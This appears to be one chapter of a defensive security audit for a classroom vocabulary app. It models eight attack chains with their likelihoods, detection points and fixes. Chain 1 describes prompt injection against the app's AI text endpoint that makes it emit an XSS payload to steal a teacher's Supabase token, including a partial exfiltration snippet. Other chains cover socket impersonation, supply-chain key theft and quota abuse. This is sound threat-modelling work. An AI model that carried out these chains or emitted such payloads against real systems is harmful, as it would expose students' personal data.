# 13 — Cross-System Attack Chains

> Single-module audits miss the most dangerous attacks: those that chain
> low-severity primitives across modules into a catastrophic outcome.
> This chapter is the attacker's storyboard.

For each chain, we model: **objective → primitives chained → likelihood
→ detection points → containment → blast radius → score reduction
after recommended fixes**.

---

## Chain 1: Stored XSS via AI output → token theft → cross-class data leak

### Objective
Steal a teacher's Supabase access token, exfiltrate their class's
gradebook (PII of all enrolled students).

### Primitives chained
1. **Prompt-injection in `/api/ai-process-text`** (module 06) → AI
   returns `english: "<img onerror='fetch(…).then(…)' src=x>"`.
2. **Worksheet renderer interpolates AI output** into a downloadable
   PDF/HTML preview (module 07 — needs verification).
3. **Teacher previews the worksheet in-app**; the renderer evaluates
   the payload because it's an HTML preview frame.
4. The payload reads `localStorage.['supabase.auth.token']` (module 09).
5. The payload `fetch()`s to an attacker URL — but CSP `connect-src`
   restricts this. The attacker uses `navigator.sendBeacon` to a
   server they got onto the allowlist (none today) — **blocked**.
6. Alternate exfil: `<img src="https://allowed-cdn-on-csp/?data=...">` —
   blocked unless attacker controls an allowlisted endpoint.

### Likelihood
**LOW**. CSP `connect-src` + `img-src` restrict outbound; CSP
`script-src` denies inline. The attacker would need a stored-XSS that
ends up *executing* — which requires a non-React render path. The QR
SVG path is self-generated.

### Detection points
- Input firewall on `/api/ai-process-text` rejects `<` in user content
  → 95% of attempts blocked.
- CSP violation report would fire on the `img-src` deny.
- Sentry would observe the worksheet renderer throwing.

### Containment
- Patch the input firewall same day.
- Rotate `SUPABASE_JWT_SECRET` if any successful exfil suspected.

### Blast radius
Worst case: one teacher's class gradebook (~30 students' names + IDs +
progress data) exfiltrated.

### Score after sprint fixes
Chain becomes infeasible: input firewall + CSP `report-uri` + Gemini
`responseSchema` JSON mode.

---

## Chain 2: Quick Play code sweep → teacher event impersonation

### Objective
Take over an active classroom Quick Play session: kick the real
teacher's view offline, manipulate scores.

### Primitives chained
1. **Code sweep** (module 05) — 1.68M 4-char codes; ~30min on a 100-
   node residential botnet.
2. **Find an active session** — receive 200 from `/api/quick-play/session/:code`.
3. **Connect socket on `/quick-play` namespace** (no auth).
4. **Emit `QP_EVENTS.TEACHER_END`** — if the handler doesn't re-verify
   teacher identity (FLAGGED as residual risk), the session terminates.
5. **Repeat across active sessions** in real time.

### Likelihood
**MODERATE** if step 4 isn't verified; **LOW** if it is.

### Detection points
- Sweep: 95% 404 rate on `/api/quick-play/session/:code` → P1 alert.
- Anomalous `TEACHER_END` rate per socket → P0 alert.

### Containment
- Cloudflare WAF challenge for the offending ASN.
- Disable Quick Play feature flag until length-6 + handler-guard fix
  ships.
- Cleanup orphaned anon users post-incident.

### Blast radius
Reputation, not data. Quick Play stores no PII beyond joiner names.

### Score after sprint fixes
- 4 → 6 char code = 1300× harder to sweep.
- `requireTeacherForSession()` inline in every `TEACHER_*` handler =
  attack infeasible.

---

## Chain 3: Compromised teacher account → mass assignment edit → cross-class brand abuse

### Objective
Use a phished teacher account to push offensive content into many
classes simultaneously.

### Primitives chained
1. **Phishing** — teacher clicks a link, enters OTP into a fake
   GoTrue page.
2. **Attacker obtains valid JWT.**
3. **Iterates teacher's classes**: `GET /rest/v1/classes?teacher_uid=eq.<uid>`.
4. **For each class, PATCH assignments** with offensive titles or word
   lists.
5. Students receive the next assignment with abusive content.

### Likelihood
**LOW** — phishing is realistic but tractable; the attacker still
needs to land OTP-stage credentials.

### Detection points
- Sudden bulk edit of >5 assignments by one teacher in <1 minute → P2
  alert.
- `audit_log` shows non-typical access pattern.
- Impossible-travel (if implemented).

### Containment
- Operator suspends teacher account.
- Rolls back PATCH'd assignments from R2 backup.
- Notifies affected schools.

### Blast radius
~1-5 classes × ~30 students each. Reputational, recoverable.

### Score after sprint fixes
- Per-teacher bulk-edit rate alert.
- MFA enforcement for teachers (Supabase TOTP).
- Audit-log dashboard surfaces this in real time.

---

## Chain 4: Service-role key leak via Fly logs

### Objective
Obtain `SUPABASE_SERVICE_ROLE_KEY` for RLS bypass to entire DB.

### Primitives chained
1. **Get read access to Fly logs.** Requires an operator account
   compromise (operator phished, or a leaked Fly token).
2. **Find a log line containing the key.** Current code (server.ts
   :91-107) only logs prefix/suffix/length on validation. No log line
   prints the full key.
3. Without a full key, **read access doesn't help** — the prefix is
   `eyJhbGc…`, public knowledge.

### Likelihood
**VERY LOW** — current logging is sound.

### Detection points
- Fly audit log: operator account login from new device → P1 alert.
- Github audit log: anyone pulling secrets via `flyctl ssh`.

### Containment
- Rotate `SUPABASE_SERVICE_ROLE_KEY` via Supabase dashboard.
- Update Fly secrets, restart machines.
- Audit `audit_log` for service-role-driven changes in the window.

### Blast radius
**Catastrophic if successful** — but the chain depends on operator
credential compromise, not Vocaband code. Pure infra blast radius.

### Score after sprint fixes
- Quarterly rotation drill — bounds blast time.
- Operator MFA + Fly token scoping (already standard).

---

## Chain 5: Supply-chain compromise → server.ts patch → student PII exfil

### Objective
Land malicious code that exfiltrates progress data.

### Primitives chained
1. **Compromise a transitive npm dep.** Attacker pushes a malicious
   version of an indirect dep used by the Express stack.
2. **Dependabot opens a PR.** Reviewer approves (single-reviewer
   weakness).
3. **Code lands on `main`** — Fly auto-deploys.
4. **Malicious dep reads env, exfiltrates `SUPABASE_SERVICE_ROLE_KEY`**
   to attacker URL — limited by SSRF-defence at provider level.
5. Attacker uses the key to drain `progress` table.

### Likelihood
**LOW-MODERATE.** This is the highest-likelihood chain because supply-
chain compromise is automatable industry-wide.

### Detection points
- `npm audit` HIGH gate — works only on **known** CVEs (zero-day slips).
- Dependabot PR review — single reviewer is the weakness.
- Fly egress logs — calls to non-allowlisted hosts.

### Containment
- Revert the offending commit.
- Rotate every secret in the Fly env.
- Re-issue `SUPABASE_JWT_SECRET` — invalidates all tokens.
- Restore from R2 backup if data was tampered.

### Blast radius
Entire DB readable. PPA-13 reportable. Severe reputation hit.

### Score after sprint fixes
- CodeQL + Semgrep in CI: detects known patterns.
- Socket.dev or `npm-audit-resolver`: behavioural review of new deps.
- 2-reviewer rule for `package.json` / `package-lock.json` (CODEOWNERS).
- Fly egress allowlist (host firewall).

---

## Chain 6: SSRF via Worker proxy → internal metadata

### Objective
Read Cloudflare account metadata via Worker SSRF.

### Primitives chained
1. **Discover a path that fetches a user-controlled URL.** None today —
   `API_BACKEND` is a constant; audio-pack fetches a templated URL
   (sanitisation needed but path traversal is the issue, not full SSRF).
2. **Exploit a path-traversal** in `id` parameter to escape the Supabase
   storage bucket boundary.
3. Even on success, Cloudflare's metadata service doesn't exist for
   Workers the way AWS IMDS does.

### Likelihood
**VERY LOW.**

### Detection points
- Audio-pack abnormal `id` formats → reject + alert.

### Containment
- Patch `id` regex `[a-z0-9_-]+`.
- Cloudflare WAF for abnormal patterns.

### Blast radius
None today.

---

## Chain 7: WebSocket race → stale-token authorisation

### Objective
Continue receiving live-challenge scores after a teacher's account is
suspended.

### Primitives chained
1. **Teacher account compromised; operator revokes.**
2. **Compromised socket connection remains open** (module 08 — no
   mid-stream re-verification).
3. **Attacker watches scores in real time** until the socket
   disconnects (could be hours).

### Likelihood
**LOW.** Requires prior compromise. Blast radius is small (scores
only).

### Detection points
- Operator-side suspension event fires a webhook → server emits
  `force_disconnect` to all sockets of that uid (this is a feature to
  build).

### Containment
- Restart Fly machines (drops all sockets).
- Force re-login via JWT secret rotation.

### Blast radius
Limited to live-challenge view (no PII flows after JOIN).

### Score after sprint fixes
- Mid-stream token re-verify every 5 min.
- Suspension webhook → `force_disconnect` event.

---

## Chain 8: Public anon-key abuse → Supabase quota exhaustion

### Objective
Cost-pump Supabase by hammering its public API as anonymous.

### Primitives chained
1. **Extract `VITE_SUPABASE_ANON_KEY` from any deployed bundle** — it's
   in the JS.
2. **Hit `/auth/v1/signup` with anon** — bounded by GoTrue defaults.
3. **Hit `/rest/v1/*` with anon** — RLS denies everything but `classes
   SELECT` (lookup during signup).
4. **Repeatedly call `classes` SELECT for enumeration.**

### Likelihood
**MODERATE** — this happens to any public Supabase project; the
question is cost.

### Detection points
- Supabase usage dashboard shows row-reads spiking.
- Sentry: `403 RLS denied` rate.

### Containment
- Rotate anon key (commit + redeploy).
- Cloudflare WAF: rate-limit `/rest/v1/classes` at the edge (we proxy
  everything that hits vocaband.com).
- Supabase has a per-anon-key rate limit; verify it's set.

### Blast radius
Cost, not data.

### Score after sprint fixes
- Cloudflare WAF rule.
- Supabase per-anon-key rate limit at conservative threshold.

---

## Summary

| Chain | Likelihood today | Likelihood post-sprint | Blast radius |
|---|---|---|---|
| 1 Stored-XSS via AI | LOW | NIL | one class gradebook |
| 2 QP code sweep + teacher impersonation | MODERATE | NIL | one classroom session |
| 3 Compromised teacher → bulk edit | LOW | LOW | 1-5 classes content |
| 4 Service-role leak via logs | VERY LOW | VERY LOW | entire DB |
| 5 Supply-chain compromise | LOW-MODERATE | LOW | entire DB |
| 6 SSRF via Worker | VERY LOW | NIL | none today |
| 7 Stale-token socket | LOW | NIL | scores view |
| 8 Anon-key abuse | MODERATE | LOW | cost only |

**Net composite breach probability (12-month):** 12-18% today →
3-5% post-sprint.
